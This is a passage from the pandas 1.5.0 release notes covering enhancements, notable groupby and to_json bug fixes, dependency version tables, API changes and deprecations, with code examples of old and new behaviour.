:func:`concat` now raises when ``levels`` contains duplicate values (:issue:`46653`)\n- Added ``numeric_only`` argument to :meth:`DataFrame.corr`, :meth:`DataFrame.corrwith`, :meth:`DataFrame.cov`, :meth:`DataFrame.idxmin`, :meth:`DataFrame.idxmax`, :meth:`.DataFrameGroupBy.idxmin`, :meth:`.DataFrameGroupBy.idxmax`, :meth:`.DataFrameGroupBy.var`, :meth:`.SeriesGroupBy.var`, :meth:`.DataFrameGroupBy.std`, :meth:`.SeriesGroupBy.std`, :meth:`.DataFrameGroupBy.sem`, :meth:`.SeriesGroupBy.sem`, and :meth:`.DataFrameGroupBy.quantile` (:issue:`46560`)\n- A :class:`errors.PerformanceWarning` is now thrown when using ``string[pyarrow]`` dtype with methods that don't dispatch to ``pyarrow.compute`` methods (:issue:`42613`, :issue:`46725`)\n- Added ``validate`` argument to :meth:`DataFrame.join` (:issue:`46622`)\n- Added ``numeric_only`` argument to :meth:`.Resampler.sum`, :meth:`.Resampler.prod`, :meth:`.Resampler.min`, :meth:`.Resampler.max`, :meth:`.Resampler.first`, and :meth:`.Resampler.last` (:issue:`46442`)\n- ``times`` argument in :class:`.ExponentialMovingWindow` now accepts ``np.timedelta64`` (:issue:`47003`)\n- :class:`.DataError`, :class:`.SpecificationError`, :class:`.SettingWithCopyError`, :class:`.SettingWithCopyWarning`, :class:`.NumExprClobberingError`, :class:`.UndefinedVariableError`, :class:`.IndexingError`, :class:`.PyperclipException`, :class:`.PyperclipWindowsException`, :class:`.CSSWarning`, :class:`.PossibleDataLossError`, :class:`.ClosedFileError`, :class:`.IncompatibilityWarning`, :class:`.AttributeConflictWarning`, :class:`.DatabaseError`, :class:`.PossiblePrecisionLoss`, :class:`.ValueLabelTypeMismatch`, :class:`.InvalidColumnName`, and :class:`.CategoricalConversionWarning` are now exposed in ``pandas.errors`` (:issue:`27656`)\n- Added ``check_like`` argument to :func:`testing.assert_series_equal` (:issue:`47247`)\n- Add support for :meth:`.DataFrameGroupBy.ohlc` and :meth:`.SeriesGroupBy.ohlc` for extension array dtypes (:issue:`37493`)\n- Allow reading compressed SAS files with :func:`read_sas` (e.g., ``.sas7bdat.gz`` files)\n- :func:`pandas.read_html` now supports extracting links from table cells (:issue:`13141`)\n- :meth:`DatetimeIndex.astype` now supports casting timezone-naive indexes to ``datetime64[s]``, ``datetime64[ms]``, and ``datetime64[us]``, and timezone-aware indexes to the corresponding ``datetime64[unit, tzname]`` dtypes (:issue:`47579`)\n- :class:`Series` reducers (e.g. ``min``, ``max``, ``sum``, ``mean``) will now successfully operate when the dtype is numeric and ``numeric_only=True`` is provided; previously this would raise a ``NotImplementedError`` (:issue:`47500`)\n- :meth:`RangeIndex.union` now can return a :class:`RangeIndex` instead of a :class:`Int64Index` if the resulting values are equally spaced (:issue:`47557`, :issue:`43885`)\n- :meth:`DataFrame.compare` now accepts an argument ``result_names`` to allow the user to specify the result's names of both left and right DataFrame which are being compared. This is by default ``'self'`` and ``'other'`` (:issue:`44354`)\n- :meth:`DataFrame.quantile` gained a ``method`` argument that can accept ``table`` to evaluate multi-column quantiles (:issue:`43881`)\n- :class:`Interval` now supports checking whether one interval is contained by another interval (:issue:`46613`)\n- Added ``copy`` keyword to :meth:`Series.set_axis` and :meth:`DataFrame.set_axis` to allow user to set axis on a new object without necessarily copying the underlying data (:issue:`47932`)\n- The method :meth:`.ExtensionArray.factorize` accepts ``use_na_sentinel=False`` for determining how null values are to be treated (:issue:`46601`)\n- The ``Dockerfile`` now installs a dedicated ``pandas-dev`` virtual environment for pandas development instead of using the ``base`` environment (:issue:`48427`)\n\n.. ---------------------------------------------------------------------------\n.. _whatsnew_150.notable_bug_fixes:\n\nNotable bug fixes\n~~~~~~~~~~~~~~~~~\n\nThese are bug fixes that might have notable behavior changes.\n\n.. _whatsnew_150.notable_bug_fixes.groupby_transform_dropna:\n\nUsing ``dropna=True`` with ``groupby`` transforms\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\nA transform is an operation whose result has the same size as its input. When the\nresult is a :class:`DataFrame` or :class:`Series`, it is also required that the\nindex of the result matches that of the input. In pandas 1.4, using\n:meth:`.DataFrameGroupBy.transform` or :meth:`.SeriesGroupBy.transform` with null\nvalues in the groups and ``dropna=True`` gave incorrect results. Demonstrated by the\nexamples below, the incorrect results either contained incorrect values, or the result\ndid not have the same index as the input.\n\n.. ipython:: python\n\n    df = pd.DataFrame({'a': [1, 1, np.nan], 'b': [2, 3, 4]})\n\n*Old behavior*:\n\n.. code-block:: ipython\n\n    In [3]:  Value in the last row should be np.nan\n            df.groupby('a', dropna=True).transform('sum')\n    Out[3]:\n       b\n    0  5\n    1  5\n    2  5\n\n    In [3]:  Should have one additional row with the value np.nan\n            df.groupby('a', dropna=True).transform(lambda x: x.sum())\n    Out[3]:\n       b\n    0  5\n    1  5\n\n    In [3]:  The value in the last row is np.nan interpreted as an integer\n            df.groupby('a', dropna=True).transform('ffill')\n    Out[3]:\n                         b\n    0                    2\n    1                    3\n    2 -9223372036854775808\n\n    In [3]:  Should have one additional row with the value np.nan\n            df.groupby('a', dropna=True).transform(lambda x: x)\n    Out[3]:\n       b\n    0  2\n    1  3\n\n*New behavior*:\n\n.. ipython:: python\n\n    df.groupby('a', dropna=True).transform('sum')\n    df.groupby('a', dropna=True).transform(lambda x: x.sum())\n    df.groupby('a', dropna=True).transform('ffill')\n    df.groupby('a', dropna=True).transform(lambda x: x)\n\n.. _whatsnew_150.notable_bug_fixes.to_json_incorrectly_localizing_naive_timestamps:\n\nSerializing tz-naive Timestamps with to_json() with ``iso_dates=True``\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\n:meth:`DataFrame.to_json`, :meth:`Series.to_json`, and :meth:`Index.to_json`\nwould incorrectly localize DatetimeArrays/DatetimeIndexes with tz-naive Timestamps\nto UTC. (:issue:`38760`)\n\nNote that this patch does not fix the localization of tz-aware Timestamps to UTC\nupon serialization. (Related issue :issue:`12997`)\n\n*Old Behavior*\n\n.. code-block:: ipython\n\n    In [32]: index = pd.date_range(\n       ....:     start='2020-12-28 00:00:00',\n       ....:     end='2020-12-28 02:00:00',\n       ....:     freq='1H',\n       ....: )\n       ....:\n\n    In [33]: a = pd.Series(\n       ....:     data=range(3),\n       ....:     index=index,\n       ....: )\n       ....:\n\n    In [4]: from io import StringIO\n\n    In [5]: a.to_json(date_format='iso')\n    Out[5]: '{\"2020-12-28T00:00:00.000Z\":0,\"2020-12-28T01:00:00.000Z\":1,\"2020-12-28T02:00:00.000Z\":2}'\n\n    In [6]: pd.read_json(StringIO(a.to_json(date_format='iso')), typ=\"series\").index == a.index\n    Out[6]: array([False, False, False])\n\n*New Behavior*\n\n.. code-block:: ipython\n\n    In [34]: from io import StringIO\n\n    In [35]: a.to_json(date_format='iso')\n    Out[35]: '{\"2020-12-28T00:00:00.000Z\":0,\"2020-12-28T01:00:00.000Z\":1,\"2020-12-28T02:00:00.000Z\":2}'\n\n     Roundtripping now works\n    In [36]: pd.read_json(StringIO(a.to_json(date_format='iso')), typ=\"series\").index == a.index\n    Out[36]: array([ True,  True,  True])\n\n.. _whatsnew_150.notable_bug_fixes.groupby_value_counts_categorical:\n\nDataFrameGroupBy.value_counts with non-grouping categorical columns and ``observed=True``\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\nCalling :meth:`.DataFrameGroupBy.value_counts` with ``observed=True`` would incorrectly drop non-observed categories of non-grouping columns (:issue:`46357`).\n\n.. code-block:: ipython\n\n    In [6]: df = pd.DataFrame([\"a\", \"b\", \"c\"], dtype=\"category\").iloc[0:2]\n    In [7]: df\n    Out[7]:\n       0\n    0  a\n    1  b\n\n*Old Behavior*\n\n.. code-block:: ipython\n\n    In [8]: df.groupby(level=0, observed=True).value_counts()\n    Out[8]:\n    0  a    1\n    1  b    1\n    dtype: int64\n\n\n*New Behavior*\n\n.. code-block:: ipython\n\n    In [9]: df.groupby(level=0, observed=True).value_counts()\n    Out[9]:\n    0  a    1\n    1  a    0\n       b    1\n    0  b    0\n       c    0\n    1  c    0\n    dtype: int64\n\n.. ---------------------------------------------------------------------------\n.. _whatsnew_150.api_breaking:\n\nBackwards incompatible API changes\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\n.. _whatsnew_150.api_breaking.deps:\n\nIncreased minimum versions for dependencies\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\nSome minimum supported versions of dependencies were updated.\nIf installed, we now require:\n\n+-----------------+-----------------+----------+---------+\n| Package         | Minimum Version | Required | Changed |\n+=================+=================+==========+=========+\n| numpy           | 1.20.3          |    X     |    X    |\n+-----------------+-----------------+----------+---------+\n| mypy (dev)      | 0.971           |          |    X    |\n+-----------------+-----------------+----------+---------+\n| beautifulsoup4  | 4.9.3           |          |    X    |\n+-----------------+-----------------+----------+---------+\n| blosc           | 1.21.0          |          |    X    |\n+-----------------+-----------------+----------+---------+\n| bottleneck      | 1.3.2           |          |    X    |\n+-----------------+-----------------+----------+---------+\n| fsspec          | 2021.07.0       |          |    X    |\n+-----------------+-----------------+----------+---------+\n| hypothesis      | 6.13.0          |          |    X    |\n+-----------------+-----------------+----------+---------+\n| gcsfs           | 2021.07.0       |          |    X    |\n+-----------------+-----------------+----------+---------+\n| jinja2          | 3.0.0           |          |    X    |\n+-----------------+-----------------+----------+---------+\n| lxml            | 4.6.3           |          |    X    |\n+-----------------+-----------------+----------+---------+\n| numba           | 0.53.1          |          |    X    |\n+-----------------+-----------------+----------+---------+\n| numexpr         | 2.7.3           |          |    X    |\n+-----------------+-----------------+----------+---------+\n| openpyxl        | 3.0.7           |          |    X    |\n+-----------------+-----------------+----------+---------+\n| pandas-gbq      | 0.15.0          |          |    X    |\n+-----------------+-----------------+----------+---------+\n| psycopg2        | 2.8.6           |          |    X    |\n+-----------------+-----------------+----------+---------+\n| pymysql         | 1.0.2           |          |    X    |\n+-----------------+-----------------+----------+---------+\n| pyreadstat      | 1.1.2           |          |    X    |\n+-----------------+-----------------+----------+---------+\n| pyxlsb          | 1.0.8           |          |    X    |\n+-----------------+-----------------+----------+---------+\n| s3fs            | 2021.08.0       |          |    X    |\n+-----------------+-----------------+----------+---------+\n| scipy           | 1.7.1           |          |    X    |\n+-----------------+-----------------+----------+---------+\n| sqlalchemy      | 1.4.16          |          |    X    |\n+-----------------+-----------------+----------+---------+\n| tabulate        | 0.8.9           |          |    X    |\n+-----------------+-----------------+----------+---------+\n| xarray          | 0.19.0          |          |    X    |\n+-----------------+-----------------+----------+---------+\n| xlsxwriter      | 1.4.3           |          |    X    |\n+-----------------+-----------------+----------+---------+\n\nFor `optional libraries <https://pandas.pydata.org/docs/getting_started/install.html>`_ the general recommendation is to use the latest version.\nThe following table lists the lowest version per library that is currently being tested throughout the development of pandas.\nOptional libraries below the lowest tested version may still work, but are not considered supported.\n\n+-----------------+-----------------+---------+\n| Package         | Minimum Version | Changed |\n+=================+=================+=========+\n| beautifulsoup4  |4.9.3            |    X    |\n+-----------------+-----------------+---------+\n| blosc           |1.21.0           |    X    |\n+-----------------+-----------------+---------+\n| bottleneck      |1.3.2            |    X    |\n+-----------------+-----------------+---------+\n| brotlipy        |0.7.0            |         |\n+-----------------+-----------------+---------+\n| fastparquet     |0.4.0            |         |\n+-----------------+-----------------+---------+\n| fsspec          |2021.08.0        |    X    |\n+-----------------+-----------------+---------+\n| html5lib        |1.1              |         |\n+-----------------+-----------------+---------+\n| hypothesis      |6.13.0           |    X    |\n+-----------------+-----------------+---------+\n| gcsfs           |2021.08.0        |    X    |\n+-----------------+-----------------+---------+\n| jinja2          |3.0.0            |    X    |\n+-----------------+-----------------+---------+\n| lxml            |4.6.3            |    X    |\n+-----------------+-----------------+---------+\n| matplotlib      |3.3.2            |         |\n+-----------------+-----------------+---------+\n| numba           |0.53.1           |    X    |\n+-----------------+-----------------+---------+\n| numexpr         |2.7.3            |    X    |\n+-----------------+-----------------+---------+\n| odfpy           |1.4.1            |         |\n+-----------------+-----------------+---------+\n| openpyxl        |3.0.7            |    X    |\n+-----------------+-----------------+---------+\n| pandas-gbq      |0.15.0           |    X    |\n+-----------------+-----------------+---------+\n| psycopg2        |2.8.6            |    X    |\n+-----------------+-----------------+---------+\n| pyarrow         |1.0.1            |         |\n+-----------------+-----------------+---------+\n| pymysql         |1.0.2            |    X    |\n+-----------------+-----------------+---------+\n| pyreadstat      |1.1.2            |    X    |\n+-----------------+-----------------+---------+\n| pytables        |3.6.1            |         |\n+-----------------+-----------------+---------+\n| python-snappy   |0.6.0            |         |\n+-----------------+-----------------+---------+\n| pyxlsb          |1.0.8            |    X    |\n+-----------------+-----------------+---------+\n| s3fs            |2021.08.0        |    X    |\n+-----------------+-----------------+---------+\n| scipy           |1.7.1            |    X    |\n+-----------------+-----------------+---------+\n| sqlalchemy      |1.4.16           |    X    |\n+-----------------+-----------------+---------+\n| tabulate        |0.8.9            |    X    |\n+-----------------+-----------------+---------+\n| tzdata          |2022a            |         |\n+-----------------+-----------------+---------+\n| xarray          |0.19.0           |    X    |\n+-----------------+-----------------+---------+\n| xlrd            |2.0.1            |         |\n+-----------------+-----------------+---------+\n| xlsxwriter      |1.4.3            |    X    |\n+-----------------+-----------------+---------+\n| xlwt            |1.3.0            |         |\n+-----------------+-----------------+---------+\n| zstandard       |0.15.2           |         |\n+-----------------+-----------------+---------+\n\nSee :ref:`install.dependencies` and :ref:`install.optional_dependencies` for more.\n\n.. _whatsnew_150.api_breaking.other:\n\nOther API changes\n^^^^^^^^^^^^^^^^^\n\n- BigQuery I/O methods :func:`read_gbq` and :meth:`DataFrame.to_gbq` default to\n  ``auth_local_webserver = True``. Google has deprecated the\n  ``auth_local_webserver = False`` `\"out of band\" (copy-paste) flow\n  <https://developers.googleblog.com/2022/02/making-oauth-flows-safer.html?m=1#disallowed-oob>`_.\n  The ``auth_local_webserver = False`` option is planned to stop working in\n  October 2022. (:issue:`46312`)\n- :func:`read_json` now raises ``FileNotFoundError`` (previously ``ValueError``) when input is a string ending in ``.json``, ``.json.gz``, ``.json.bz2``, etc. but no such file exists. (:issue:`29102`)\n- Operations with :class:`Timestamp` or :class:`Timedelta` that would previously raise ``OverflowError`` instead raise ``OutOfBoundsDatetime`` or ``OutOfBoundsTimedelta`` where appropriate (:issue:`47268`)\n- When :func:`read_sas` previously returned ``None``, it now returns an empty :class:`DataFrame` (:issue:`47410`)\n- :class:`DataFrame` constructor raises if ``index`` or ``columns`` arguments are sets (:issue:`47215`)\n\n.. ---------------------------------------------------------------------------\n.. _whatsnew_150.deprecations:\n\nDeprecations\n~~~~~~~~~~~~\n\n.. warning::\n\n    In the next major version release, 2.0, several larger API changes are being considered without a formal deprecation such as\n    making the standard library `zoneinfo <https://docs.python.org/3/library/zoneinfo.html>`_ the default timezone implementation instead of ``pytz``,\n    having the :class:`Index` support all data types instead of having multiple subclasses (:class:`CategoricalIndex`, :class:`Int64Index`, etc.), and more.\n    The changes under consideration are logged in `this GitHub issue <https://github.com/pandas-dev/pandas/issues/44823>`_, and any\n    feedback or concerns are welcome.\n\n.. _whatsnew_150.deprecations.int_slicing_series:\n\nLabel-based integer slicing on a Series with an Int64Index or RangeIndex\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\nIn a future version, integer slicing on a :class:`Series` with a :class:`Int64Index` or :class:`RangeIndex` will be treated as *label-based*, not positional. This will make the behavior consistent with other :meth:`Series.__getitem__` and :meth:`Series.__setitem__` behaviors (:issue:`45162`).\n\nFor example:\n\n.. ipython:: python\n\n   ser = pd.Series([1, 2, 3, 4, 5], index=[2, 3, 5, 7, 11])\n\nIn the old behavior, ``ser[2:4]`` treats the slice as positional:\n\n*Old behavior*:\n\n.. code-block:: ipython\n\n    In [3]: ser[2:4]\n    Out[3]:\n    5    3\n    7    4\n    dtype: int64\n\nIn a future version, this will be treated as label-based:\n\n*Future behavior*:\n\n.. code-block:: ipython\n\n    In [4]: ser.loc[2:4]\n    Out[4]:\n    2    1\n    3    2\n    dtype: int64\n\nTo retain the old behavior, use ``series.iloc[i:j]``. To get the future behavior,\nuse ``series.loc[i:j]``.\n\nSlicing on a :class:`DataFrame` will not be affected.\n\n.. _whatsnew_150.deprecations.excel_writer_attributes:\n\n:class:`ExcelWriter` attributes\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\nAll attributes of :class:`ExcelWriter` were previously documented as not\npublic. However some third party Excel engines documented accessing\n``ExcelWriter.book`` or ``ExcelWriter.sheets``, and users were utilizing these\nand possibly other attributes. Previously these attributes were not safe to use;\ne.g. modifications to ``ExcelWriter.book`` would not update ``ExcelWriter.sheets``\nand conversely. In order to support this, pandas has made some attributes public\nand improved their implementations so that they may now be safely used. (:issue:`45572`)\n\nThe following attributes are now public and considered safe to access.\n\n - ``book``\n - ``check_extension``\n - ``close``\n - ``date_format``\n - ``datetime_format``\n - ``engine``\n - ``if_sheet_exists``\n - ``sheets``\n - ``supported_extensions``\n\nThe following attributes have been deprecated. They now raise a ``FutureWarning``\nwhen accessed and will be removed in a future version. Users should be aware\nthat their usage is considered unsafe, and can lead to unexpected results.\n\n - ``cur_sheet``\n - ``handles``\n - ``path``\n - ``save``\n - ``write_cells``\n\nSee the documentation of :class:`ExcelWriter` for further details.\n\n.. _whatsnew_150.deprecations.group_keys_in_apply:\n\nUsing ``group_keys`` with transformers in :meth:`.DataFrameGroupBy.apply` and :meth:`.SeriesGroupBy.apply`\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\nIn previous versions of pandas, if it was inferred that the function passed to\n:meth:`.DataFrameGroupBy.apply` or :meth:`.SeriesGroupBy.apply` was a transformer (i.e. the resulting index was equal to\nthe input index), the ``group_keys`` argument of :meth:`DataFrame.groupby` and\n:meth:`Series.groupby` was ignored and the group keys would never be added to\nthe index of the result. In the future, the group keys will be added to the index\nwhen the user specifies ``group_keys=True``.\n\nAs ``group_keys=True`` is the default value of :meth:`DataFrame.groupby` and\n:meth:`Series.groupby`, not specifying ``group_keys`` with a transformer will\nraise a ``FutureWarning``. This can be silenced and the previous behavior\nretained by specifying ``group_keys=False``.\n\n.. _whatsnew_150.deprecations.setitem_column_try_inplace:\n   _ see also _whatsnew_130.notable_bug_fixes.setitem_column_try_inplace\n\nInplace operation when setting values with ``loc`` and ``iloc``\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\nMost of the time setting values with :meth:`DataFrame.iloc` attempts to set values\ninplace, only falling back to inserting a new array if necessary. There are\nsome cases where this rule is not followed, for example when setting an entire\ncolumn from an array with different dtype:\n\n.. ipython:: python\n\n   df = pd.DataFrame({'price': [11.1, 12.2]}, index=['book1', 'book2'])\n   original_prices = df['price']\n   new_prices = np.array([98, 99])\n\n*Old behavior*:\n\n.. code-block:: ipython\n\n    In [3]: df.iloc[:, 0] = new_prices\n    In [4]: df.iloc[:, 0]\n    Out[4]:\n    book1    98\n    book2    99\n    Name: price, dtype: int64\n    In [5]: original_prices\n    Out[5]:\n    book1    11.1\n    book2    12.2\n    Name: price, float: 64\n\nThis behavior is deprecated. In a future version, setting an entire column with\niloc will attempt to operate inplace.\n\n*Future behavior*:\n\n.. code-block:: ipython\n\n    In [3]: df.iloc[:, 0] = new_prices\n    In [4]: df.iloc[:, 0]\n    Out[4]:\n    book1    98.0\n    book2    99.0\n    Name: price, dtype: float64\n    In [5]: original_prices\n    Out[5]:\n    book1    98.0\n    book2    99.0\n    Name: price, dtype: float64\n\nTo get the old behavior, use :meth:`DataFrame.__setitem__` directly:\n\n.. code-block:: ipython\n\n    In [3]: df[df.columns[0]] = new_prices\n    In [4]: df.iloc[:, 0]\n    Out[4]\n    book1    98\n    book2    99\n    Name: price, dtype: int64\n    In [5]: original_prices\n    Out[5]:\n    book1    11.1\n    book2    12.2\n    Name: price, dtype: float64\n\nTo get the old behaviour when ``df.columns`` is not unique and you want to\nchange a single column by index, you can use :meth:`DataFrame.isetitem`, which\nhas been added in pandas 1.5:\n\n.. code-block:: ipython\n\n    In [3]: df_with_duplicated_cols = pd.concat([df, df], axis='columns')\n    In [3]: df_with_duplicated_cols.isetitem(0, new_prices)\n    In [4]: df_with_duplicated_cols.iloc[:, 0]\n    Out[4]:\n    book1    98\n    book2    99\n    Name: price, dtype: int64\n    In [5]: original_prices\n    Out[5]:\n    book1    11.1\n    book2    12.2\n    Name: 0, dtype: float64\n\n.. _whatsnew_150.deprecations.numeric_only_default:\n\n``numeric_only`` default value\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\nAcross the :class:`DataFrame`, :class:`.DataFrameGroupBy`, and :class:`.Resampler` operations such as\n``min``, ``sum``, and ``idxmax``, the default\nvalue of the ``numeric_only`` argument, if it exists at all, was inconsistent.\nFurthermore, operations with the default value ``None`` can lead to surprising\nresults. (:issue:`46560`)\n\n.. code-block:: ipython\n\n    In [1]: df = pd.DataFrame({\"a\": [1, 2], \"b\": [\"x\", \"y\"]})\n\n    In [2]:  Reading the next line without knowing the contents of df, one would\n             expect the result to contain the products for both columns a and b.\n            df[[\"a\", \"b\"]].prod()\n    Out[2]:\n    a    2\n    dtype: int64\n\nTo avoid this behavior, the specifying the value ``numeric_only=None`` has been\ndeprecated, and will be removed in a future version of pandas. In the future,\nall operations with a ``numeric_only`` argument will default to ``False``. Users\nshould either call the operation only with columns that can be operated on, or\nspecify ``numeric_only=True`` to operate only on Boolean, integer, and float columns.\n\nIn order to support the transition to the new behavior, the following methods have\ngained the ``numeric_only`` argument.\n\n- :meth:`DataFrame.corr`\n- :meth:`DataFrame.corrwith`\n- :meth:`DataFrame.cov`\n- :meth:`DataFrame.idxmin`\n- :meth:`DataFrame.idxmax`\n- :meth:`.DataFrameGroupBy.cummin`\n- :meth:`.DataFrameGroupBy.cummax`\n- :meth:`.DataFrameGroupBy.idxmin`\n- :meth:`.DataFrameGroupBy.idxmax`\n- :meth:`.DataFrameGroupBy.var`\n- :meth:`.DataFrameGroupBy.std`\n- :meth:`.DataFrameGroupBy.sem`\n- :meth:`.DataFrameGroupBy.quantile`\n- :meth:`.Resampler.mean`\n- :meth:`.Resampler.median`\n- :meth:`.Resampler.sem`\n- :meth:`.Resampler.std`\n- :meth:`.Resampler.var`\n- :meth:`DataFrame.rolling` operations\n- :meth:`DataFrame.expanding` operations\n- :meth:`DataFrame.ewm` operations\n\n.. _whatsnew_150.deprecations.other:\n\nOther Deprecations\n^^^^^^^^^^^^^^^^^^\n- Deprecated the keyword ``line_terminator`` in :meth:`DataFrame.to_csv` and :meth:`Series.to_csv`, use ``lineterminator`` instead; this is for consistency with :func:`read_csv` and the standard library 'csv' module (:issue:`9568`)\n- Deprecated behavior of :meth:`SparseArray.astype`, :meth:`Series.astype`, and :meth:`DataFrame.astype` with :class:`SparseDtype` when passing a non-sparse ``dtype``. In a future version, this will cast to that non-sparse dtype instead of wrapping it in a :class:`SparseDtype` (:issue:`34457`)\n- Deprecated behavior of :meth:`DatetimeIndex.intersection` and :meth:`DatetimeIndex.symmetric_difference` (``union`` behavior was already deprecated in version 1.3.0) with mixed time zones; in a future version both will be cast to UTC instead of object dtype (:issue:`39328`, :issue:`45357`)\n- Deprecated :meth:`DataFrame.iteritems`, :meth:`Series.iteritems`, :meth:`HDFStore.iteritems` in favor of :meth:`DataFrame.items`, :meth:`Series.items`, :meth:`HDFStore.items`  (:issue:`45321`)\n- Deprecated :meth:`Series.is_monotonic` and :meth:`Index.is_monotonic` in favor of :meth:`Series.is_monotonic_increasing` and :meth:`Index.is_monotonic_increasing` (:issue:`45422`, :issue:`21335`)\n- Deprecated behavior of :meth:`DatetimeIndex.astype`, :meth:`TimedeltaIndex.astype`, :meth:`PeriodIndex.astype` when converting to an integer dtype other than ``int64``. In a future version, these will convert to exactly the specified dtype (instead of always ``int64``) and will raise if the conversion overflows (:issue:`45034`)\n- Deprecated the ``__array_wrap__`` method of DataFrame and Series, rely on standard numpy ufuncs instead (:issue:`45451`)\n- Deprecated treating float-dtype data as wall-times when passed with a timezone to :class:`Series` or :class:`DatetimeIndex` (:issue:`45573`)\n- Deprecated the behavior of :meth:`Series.fillna` and :meth:`DataFrame.fillna` with ``timedelta64[ns]`` dtype and incompatible fill value; in a future version this will cast to a common dtype (usually object) instead of raising, matching the behavior of other dtypes (:issue:`45746`)\n- Deprecated the ``warn`` parameter in :func:`infer_freq` (:issue:`45947`)\n- Deprecated allowing non-keyword arguments in :meth:`.ExtensionArray.argsort` (:issue:`46134`)\n- Deprecated treating all-bool ``object``-dtype columns as bool-like in :meth:`DataFrame.any` and :meth:`DataFrame.all` with ``bool_only=True``, explicitly cast to bool instead (:issue:`46188`)\n- Deprecated behavior of method :meth:`DataFrame.quantile`, attribute ``numeric_only`` will default False. Including datetime/timedelta columns in the result (:issue:`7308`).\n- Deprecated :attr:`Timedelta.freq` and :attr:`Timedelta.is_populated` (:issue:`46430`)\n- Deprecated :attr:`Timedelta.delta` (:issue:`46476`)\n- Deprecated passing arguments as positional in :meth:`DataFrame.any` and :meth:`Series.any` (:issue:`44802`)\n- Deprecated passing positional arguments to :meth:`DataFrame.pivot` and :func:`pivot` except ``data`` (:issue:`30228`)\n- Deprecated the methods :meth:`DataFrame.mad`, :meth:`Series.mad`, and the corresponding groupby methods (:issue:`11787`)\n- Deprecated positional arguments to :meth:`Index.join` except for ``other``, use keyword-only arguments instead of positional arguments (:issue:`46518`)\n- Deprecated positional arguments to :meth:`StringMethods.rsplit` and :meth:`StringMethods.split` except for ``pat``, use keyword-only arguments instead of positional arguments (:issue:`47423`)\n- Deprecated indexing on a timezone-naive :class:`DatetimeIndex` using a string representing a timezone-aware datetime (:issue:`46903`, :issue:`36148`)\n- Deprecated allowing ``unit=\"M\"`` or ``unit=\"Y\"`` in :class:`Timestamp` constructor with a non-round float value (:issue:`47267`)\n- Deprecated the ``display.column_space`` global configuration option (:issue:`7576`)\n- Deprecated the argument ``na_sentinel`` in :func:`factorize`, :meth:`Index.factorize`, and :meth:`.ExtensionArray.factorize`; pass ``use_na_sentinel=True`` instead to use the sentinel ``-1`` for NaN values and ``use_na_sentinel=False`` instead of ``na_sentinel=None`` to encode NaN values (:issue:`46910`)\n- Deprecated :meth:`.DataFrameGroupBy.transform` not aligning the result when the UDF returned DataFrame (:issue:`45648`)\n- Clarified warning from :func:`to_datetime` when delimited dates can't be parsed in accordance to specified ``dayfirst`` argument (:issue:`46210`)\n- Emit warning from :func:`to_datetime` when delimited dates can't be parsed in accordance to specified ``dayfirst`` argument even for dates where leading zero is omitted (e.g. ``31/1/2001``) (:issue:`47880`)\n- Deprecated :class:`Series` and :class:`Resampler` reducers (e.g. ``min``, ``max``, ``sum``, ``mean``) raising a ``NotImplementedError`` when the dtype is non-numric and ``numeric_only=True`` is provided; this will raise a ``TypeError`` in a future version (:issue:`47500`)\n- Deprecated :meth:`Series.rank` returning an empty result when the dtype is non-numeric and ``numeric_only=True`` is provided; this will raise a ``TypeError`` in a future version (:issue:`47500`)\n- Deprecated argument ``errors`` for :meth:`Series.mask`, :meth:`Series.where`, :meth:`DataFrame.mask`, and :meth:`DataFrame.where` as ``errors`` had no effect on this methods (:issue:`47728`)\n- Deprecated arguments ``*args`` and ``**kwargs`` in :class:`Rolling`, :class:`Expanding`, and :class:`ExponentialMovingWindow` ops. (:issue:`47836`)\n- Deprecated the ``inplace`` keyword in :meth:`Categorical.set_ordered`, :meth:`Categorical.as_ordered`, and :meth:`Categorical.as_unordered` (:issue:`37643`)\n- Deprecated setting a categorical's categories with ``cat.categories = ['a', 'b', 'c']``, use :meth:`Categorical.rename_categories` instead (:issue:`37643`)\n- Deprecated unused arguments ``encoding`` and ``verbose`` in :meth:`Series.to_excel` and :meth:`DataFrame.to_excel` (:issue:`47912`)\n- Deprecated the ``inplace`` keyword in :meth:`DataFrame.set_axis` and :meth:`Series.set_axis`, use ``obj = obj.set_axis(..., copy=False)`` instead (:issue:`48130`)\n- Deprecated producing a single element when iterating over a :class:`DataFrameGroupBy` or a :class:`SeriesGroupBy` that has been grouped by a list of length 1; A tuple of length one will be returned instead (:issue:`42795`)\n- Fixed up warning message of deprecation of :meth:`MultiIndex.lesort_depth` as public method, as the message previously referred to :meth:`MultiIndex.is_lexsorted` instead (:issue:`38701`)\n- Deprecated the ``sort_columns`` argument in :meth:`DataFrame.plot` and :meth:`Series.plot` (:issue:`47563`).\n- Deprecated positional arguments for all but the first argument of :meth:`DataFrame.to_stata` and :func:`read_stata`, use keyword arguments instead (:issue:`48128`).\n- Deprecated the ``mangle_dupe_cols`` argument in :func:`read_csv`, :func:`read_fwf`, :func:`read_table` and :func:`read_excel`. The argument was never implemented, and a new argument where the renaming pattern can be specified will be added instead (:issue:`47718`)\n- Deprecated allowing ``dtype='datetime64'`` or ``dtype=np.datetime64`` in :meth:`Series.astype`, use \"datetime64[ns]\" instead (:issue:`47844`)\n\n.. ---------------------------------------------------------------------------\n.. _whatsnew_150.performance:\n\nPerformance improvements\n~~~~~~~~~~~~~~~~~~~~~~~~\n- Performance improvement in :meth:`DataFrame.corrwith` for column-wise (axis=0) Pearson and Spearman correlation when other is a :class:`Series` (:issue:`46174`)\n- Performance improvement in :meth:`.DataFrameGroupBy.transform` 